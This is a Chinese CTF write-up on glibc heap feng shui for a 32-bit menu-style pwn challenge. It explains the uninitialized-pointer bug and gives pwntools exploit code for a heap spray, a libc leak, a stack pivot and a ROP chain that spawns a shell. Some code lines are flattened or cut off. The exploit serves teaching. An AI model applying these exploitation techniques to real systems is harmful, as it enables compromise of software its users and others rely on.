version="1.0" encoding="utf-8"?

# Glibc PWN“堆风水”应用详解

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NzcxNjAyMQ==&mid=2247483831&idx=1&sn=4a95fd196c72d4fca862563b2a8669d9&chksm=fc30c6edcb474ffb29007f6c26eda09cb30725573a238e331e431399b3c7685eee2b3bb00b6b&scene=126&sessionid=1681400529#rd](http://mp.weixin.qq.com/s?__biz=MzU1NzcxNjAyMQ==&mid=2247483831&idx=1&sn=4a95fd196c72d4fca862563b2a8669d9&chksm=fc30c6edcb474ffb29007f6c26eda09cb30725573a238e331e431399b3c7685eee2b3bb00b6b&scene=126&sessionid=1681400529#rd)

## **前言**

二进制漏洞主要分为栈、格式化串和堆三个类别的漏洞，在现今的实际应用环境中，NX、ASLR和PIE等缓存措施基本成为标配。“格式化串漏洞”在开发流程比较严格的公司，源码静态扫描阶段运用Coverity等工具就可以完成识别整改，此类漏洞已经罕见。更有甚者会定制操作系统将libc中printf族函数对%n的支持删除，以此彻底杜绝格式化串漏洞导致的任意写。而栈类漏洞由于栈cookie的存在，并且真实环境中很难会有leak机会，利用成功率非常之低。这样利用成功率较高的只剩堆类漏洞，像UAF、堆溢出等结合堆风水（堆喷射）技术，甚至可以实现无leak利用成功，比如live555堆溢出的利用CVE-2018-4013。

传统CTF的堆类PWN题目多考察glibc中对ptmalloc机制的理解，运用布局解题，其技巧在真实环境中不夸张的讲，如果不结合堆风水，毫无用处。熟悉并运用堆风水技术，是一个PWN手成长的必经之路。

本文基于《堆喷思想在glibc pwn中的应用》一文，对一道更接近Realworld、设计精妙的“堆风水”题目，进行更详尽的题解分析。

  

## **本地环境**

Ubuntu 16.04 x64 + libc2.2.3，官方exp打不成功，需要重新对libc相关的偏移和gadget进行一下调整。

  

## **题目介绍**

32位ELF，PIE/ASLR/CANARY/RELRO全开，菜单题

puts("1. Create many notes");puts("2. Display many notes");puts("3. Delete many notes");puts("4. Modify note");puts("5. Calling special functions");

  

notes存储在全局数组Unitg\_buffer\[4096\]中，Unit大小为8。

struct Unit{    char \*ptr;    unsigned int size;};

  

开局先随机malloc一块内存，使后续堆内存无法精确布局

![](../Images/778a8ae742ea4e2b4eb1e0e6a6845db6.png)

定义好菜单函数def create(sz, data):    p.recvuntil('>>> ')    p.sendline('1')    p.recvuntil(': ')    p.sendline(str(sz))    for buf, te in data:        p.recvuntil(': ')        p.sendline(buf)        p.recvuntil(': ')        p.sendline(str(te))def display(s\_idx, e\_idx):    p.recvuntil('>>> ')    p.sendline('2')    p.recvuntil(': ')    p.sendline(str(s\_idx))    p.recvuntil(': ')    p.sendline(str(e\_idx))def delete():    p.recvuntil('>>> ')    p.sendline('3')def modify(idx, buf):    p.recvuntil('>>> ')    p.sendline('4')    p.recvuntil(': ')    p.sendline(str(idx))    p.recvuntil(': ')    p.sendline(buf)def callfunc(idx):    p.recvuntil('>>> ')    p.sendline('5')    p.recvuntil(': ')    p.sendline(str(idx))

  

### **Create**

全局数组的总体布局如下所示：

![](../Images/4bcd4ab13810b298a9736740104f7cb0.png)

  

分为256个组（block），每个组有16个元素，256\*16 = 4096。

第1组，元素index范围为0~15；

第2组，元素index范围为16~31;

...

第n组，元素index范围为16\*(n-1) ~16\*(n-1)+15

![](../Images/32c219b02532738aad435860c42c3142.png)

  

  添加操作（create）一次添加1组16个元素，每个元素的size相同。顺序从0开始查找第一个空闲的组（如上图，若0、1已被使用，使用2），但组内16个元素是随机放置入的，即时间上第1个分配的内存指针不一定放在位置0。每个元素申请的内存大小为size+4（size为获取的用户输入），多申请的4字节用来保存一个int指针。

![](../Images/8aa4ea56d1704d97844f1b98f0618678.png)

read\_str调用read读入数据，并在结尾增加\\0。然后根据类型将末尾的4字节赋为不同的代码段地址，该地址可以泄露绕过PIE，但实际泄露libc就足够了。

这个4字节的赋值逻辑正是漏洞所在，如果type不为1-4中的值，就不会赋值，就可以使用上一次内存释放后残留的值。

添加结束后，将当前添加的组id（blockid）存放在全局变量g\_last\_blockid中，这个变量在删除中会使用。

  

### **Display**

![](../Images/394776a9a83f292f43d0a8ffc6df2529.png)

输入一个index范围，将范围内元素指针的值打印出来，\\0会截断。  

### **Delete**

![](../Images/5ef7f22b72320b71146ba5ff4823cc18.png)

根据create结束时赋值的blockid，按组删除元素即一次free掉16个元素，并清除野指针。删除一组元素后g\_last\_blockid减1，可多次调用直到将所有block都删除。因为申请时随机位置，释放时也是随机顺序，chunk可能会放入unsorted bin中。  

### **Modify**

![](../Images/a830e20790ddfff8b0b656a62da20ac1.png)

修改数据，无法修改到末尾的4字节，利用时可以不使用。

  

### **CallFunc**

### 输入某个元素的index后:

  

如果该元素内容末尾的后4字节指针不为0，将指针所指内容的数据减1；

如果该指针为空，就call再偏移4字节的地址。

结合create中的漏洞，可以完成如下功能：

  

1、任意地址数据减1。这个乍看起来好像没什么用，实际有妙用，下文介绍。

2、任意地址跳转，直接可控制PC，但是现在并不知道跳到哪里。

  

## **堆风水**

综合以上分析可知，泄露libc基址是直接目标。

可以利用create中漏洞将unsorted bin中main\_arena地址残留下来，但是元素内容有\\0截断。那么问题就演变为如何消除\\0截断了，正好callFunc中有一个任意地址数据减1功能，而这个功能需要知道chunk地址。

  

**如何获得chunk地址？**

开头随机分配的内存大小足以让所有暴破想法全部失效，此时就需要应用堆风水思想。

反复观察可以发现，heap区间会位于0x56000000~0x59000000之间。假设选定地址0x57575757，申请0x100个0x200004大小内存（chunksize为0x20008），就可以覆盖0x56000000至0x58000000整个区间。如果将这0x100个元素的内容都填充为0x57，那么地址0x57575757中的数据也将有极高的概率是0x57575757。同样的，利用create中的未初始化漏洞，元素末尾的4字节可以是残留下来的0x57575757，再利用减1功能，结合输出就可以定位到0x57575757这个地址所在的元素index。  

### **malloc中的玄机**

要想直接申请0x100个0x200004大小内存将0x56000000~0x58000000区域填充并没有想像得这么简单。

Glibc ptmalloc在topchunk的size满足不了malloc所需要字节数时，有两种策略：

1、直接调用mmap，释放时再调用unmap2、调用sbrk增大topchunk的size，然后再从topchunk中切割想要达到我们要的效果，必须是第二种策略。实际调试topchunk默认情况如下：top: 0x5717e2f8 (size : 0x20d08)大小只比要申请的0x20004略大。

create一次申请1组16个元素，只有第1个可以直接从topchunk切割，剩下的15个就要么直接返回mmap内存页，要么调用sbrk增大topchunk再切割。

是否使用mmap，有如下条件：static void \*sysmalloc (INTERNAL\_SIZE\_T nb, mstate av){   ...   if (av == NULL      || ((unsigned long) (nb) >= (unsigned long) (mp\_.mmap\_threshold)   && (mp\_.n\_mmaps < mp\_.n\_mmaps\_max)))    {      char \*mm;           /\* return value from mmap call\*/  
    try\_mmap:         ...   ...}需要申请的字节数加上chunk头后的长度大于mp\_.mmap\_threshold，才会进入mmap。默认情况下mp\_.mmap\_threshold为0x20000

![](../Images/7fbcdc1b8f385f772bb4ce0e9a2e9777.png)

而在函数void \_\_libc\_free (void \*mem)存在如下代码：if (chunk\_is\_mmapped (p))                       /\* release mmapped memory. \*/    {      /\* see if the dynamic brk/mmap threshold needs adjusting \*/      if (!mp\_.no\_dyn\_threshold          && p->size > mp\_.mmap\_threshold          && p->size <= DEFAULT\_MMAP\_THRESHOLD\_MAX)        {          mp\_.mmap\_threshold = chunksize (p);          mp\_.trim\_threshold = 2 \* mp\_.mmap\_threshold;          LIBC\_PROBE (memory\_mallopt\_free\_dyn\_thresholds, 2,                      mp\_.mmap\_threshold, mp\_.trim\_threshold);        }      munmap\_chunk (p);      return;}

  

也就是释放mmap申请的内存时会更新这个mp\_.mmap\_threshold。经过测试，create一组0x20000（实际malloc参数0x20004）大小元素再释放后，mp\_.mmap\_threshold更新为0x21000。

![](../Images/6f0c2397009d8405c8fac54cb9bdd639.png)

之后再申请0x100个0x20004大小内存，就都会从topchunk切割进而达到了堆喷射的条件。

  

### **计算堆块地址**

为调试方便关闭ASLR，echo 0 \\> /proc/sys/kernel/randomize\_va\_space，IDA Rebase0x56555000。堆喷填充令堆内大部分区域为 0x57：MAGIC\_BYTE = '\\x57'TARGET\_BYTE = chr(ord(MAGIC\_BYTE) - 1)MAGIC\_ADDR = u32(MAGIC\_BYTE\*4)data = \[\]for i in range(0x10):    data.append(\[MAGIC\_BYTE \* (0x20000 - 1), 1\])#增大mmap阈值create(0x20000, data)delete()#堆喷，16组共256个0x200008大小chunk，令起始堆块到MAGIC\_ADDR的都填充为MAGIC\_BYTEfor i in range(0x10):    create(0x20000, data)#申请再释放，构造数据残留data = \[\]for i in range(0x10):    data.append(\[MAGIC\_BYTE \* (0x1000 - 1), 1\])create(0x1000, data)delete()#create类型为0末尾4字节不赋值，这个值就是残留下来的MAGIC\_ADDRdata = \[\]for i in range(0x10):    data.append(\[MAGIC\_BYTE \* (0xf0 - 1), 0\])create(0xf0, data)#触发减1操作，此时\*(MAGIC\_ADDR) = MAGIC\_ADDR - 1，本例中是0x57575756callfunc(0x100)#由于只对一个字节做了修改，其他字节还是MAGIC\_BYTE，因此可以搜索到MAGIC\_ADDR在哪个元素的内存域间即可获得index，并得到MAGIC\_ADDR相对于此chunk开头的偏移量display(0, 0x100)index = 0offest = 0out = ''for i in range(0x100): out = p.recvline() if TARGET\_BYTE in out: index = i breakout = out\[12 : \]offest = out.index(TARGET\_BYTE

 

如下图例子所示g\_buffer布局，256个0x20004大小元素

![](../Images/f0dca53671b8e9e51e569c99519677c2.png)

地址0x57575757位于第8组元素，全局index为131，偏移量0x57575757-0x57562b88=76751。因为各个block内的元素是随机申请的，并不是地址大的index就大，得到以上信息并不能计算出0x57562b88相对于第1个申请的元素的内存地址偏移量。block在create时是顺序分配的，地址区间相连。

![](../Images/95c259861eb5e86011af910e100563da.png)

利用这一点，就可以从堆内存布局角度出发，通过逐个判断chunk所对应元素有没有跨越block推导确定出当前block里在时间上是第一或最后分配的chunk，从而确定堆地址。

 

从MAGIC\_ADDR所在chunk开始，逐个向前计算出该chunk对应元素在g\_buffer中的位置。如何搞定？仍然使用堆喷射的方法。#根据MAGIC\_ADDR所属chunk对应元素index，计算得到当前block开始的indexblock\_start = (index / 0x10) \* 0x10#与block中时间上第1个申请的chunk之间相隔的chunk数count = 1#搜索到的chunk对应的元素indexp\_index = 0while count < block\_start/0x10:    log.info("start find prev chunk count = %d" % count)#堆喷构造数据残留，和上面定位MAGIC\_ADDR的方法类似，使元素内容的末尾4字节填充为pre\_chunkaddr，0x20008是chunksize    data = \[\] pre\_chunkaddr = p32(MAGIC\_ADDR - 0x20008 \* count)    for i in range(0x10):        data.append(\[pre\_chunkaddr \* (0x1000 / 4 - 1), 1\])    create(0x1000, data)    delete()  
    data = \[\]    for i in range(0x10):        data.append(\[MAGIC\_BYTE \* (0xa0 - 1), 0\])    create(0xa0, data)  
    log.info("start call fuc count = %d" % count)#触发减1操作，第1次堆喷时有\*(pre\_chunkaddr) = MAGIC\_ADDR，因此减1后搜索TARGET\_BYTE就可以确定index了    callfunc(0x100)    display(block\_start - 0x10, index + 1)    p\_index = 0    out = ''    for i in range(index + 1 - block\_start + 0x10):        out = p.recvline()        if TARGET\_BYTE in out:            p\_index = i + block\_start - 0x10            break    delete()#该index已在前一个block里了，证明该chunk就是该block里时间上第1个申请的    if p\_index < block\_start:        break    #否则继续向前搜索count += 1

  

  

### **泄露libc**

heap\_start\_addr = MAGIC\_ADDR - 0x20008 \*(count - 1 + block\_start) - offest - 8

得到堆地址以后，前面所有用来堆喷射的chunk都清除掉。

开始泄露libc地址，heap\_start\_addr +8位置是fd，heap\_start\_addr +12位置是bk，存放有unsorted\_bin中mainarena地址。

再一次利用堆喷射，将\\0截断去掉

data = \[\]

#堆喷将空间内填充数字heap\_start\_addr+11

for i in range(0x10):

    data.append(\[p32(heap\_start\_addr + 8 + 3 ) \* (0x1000 / 4 - 1), 1\])

create(0x1000, data)

delete()

#heap\_start\_addr处开始申请chunk，aaa\\0填充unsortedbin的fd位置，末尾4字节利用数据残留为bk

data = \[\]

for i in range(0x10):

    data.append(\['aaa', 0\])

create(0xa0, data)

#利用减1将aaa\\0修改为aaa\\xff，再泄露就可以得到bk

callfunc(0)

display(0, 0x10)

for i in range(index + 1 - block\_start + 0x10):

    out = p.recvline()

    out = out\[12 : -1\]

    if 'aaa' != out:

        libc\_addr = u32(out\[4 : 8\]) + 1 - 0x1b27b0

        break

log.info('libc addr is : ' + hex(libc\_addr))

  

  

### **栈迁移+ROP**

剩下的内容就比较简单了，利用CallFunc第二个点，控制PC完成栈迁移到堆，ROP调用system。

![](../Images/993498100bc3ba83cf70e51b59493db3.png)

call eax时ecx即元素内容的指针即指向rop链开头，令eax指向xchg eax,ecx ; cld ; call dword ptr \[eax\]，再令此时的eax指向adc al, 0xf ; xchg eax, esp ; ret就完成栈迁移了。

data = \[\]

#仍然用堆喷将ropchain所在地址填充到新元素末尾的4字节之后的4字节

for i in range(0x10):

    data.append(\[p32(heap\_start\_addr + 12) \* (0x1000 / 4 - 1), 1\])

create(0x1000, data)

delete()

  

data = \[\]

ropchain = p32(libc\_addr + magic\_gadget2) + p32(0) + p32(libc\_addr+ magic\_gadget1) + 'A'\*3 + p32(libc\_addr + system\_offest) + p32(0) + p32(libc\_addr + binsh\_addr)

#令新元素内容末尾4字节为0，这样就可以劫持EIP了

for i in range(0x10):

    data.append(\[(ropchain).ljust(0xa0 -1, '\\x00'), 0\])

create(0xa0, data)

callfunc(0)

p.sendline('id')

p.interactive()

 

**更易读的exp及题目：**https://bigway.coding.net/s/425b31c6-416e-4ad6-862e-7d06e9e8108e对比官方有如下更改：1、idb增强可读性；2、exp修改了libc相关偏移，换了个gadget（本地libc中没有原exp中的gadget）及增强了可读性。

  

## **引用**

https://xz.aliyun.com/t/7189https://introspelliam.github.io/2018/05/21/pwn/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94sysmalloc/